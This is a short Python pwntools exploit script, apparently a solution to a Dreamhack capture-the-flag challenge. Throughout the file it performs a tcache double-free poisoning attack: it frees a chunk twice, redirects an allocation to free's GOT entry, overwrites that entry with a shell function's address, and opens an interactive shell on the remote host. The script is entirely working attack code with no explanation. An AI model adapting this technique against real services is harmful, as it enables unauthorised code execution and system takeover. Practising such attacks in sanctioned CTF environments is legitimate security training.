from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 9494
r = remote(HOST, PORT)

def create(size, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'Size: ', str(size).encode())
    r.sendafter(b'Data: ', data)

def delete(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'idx: ', str(idx).encode())

free_got = 0x601018
sh = 0x400ab0

create(0x20, b'A')
delete(0)
delete(0)
create(0x20, p64(free_got))
create(0x20, b'A')
create(0x20, p64(sh))

delete(0)

r.interactive()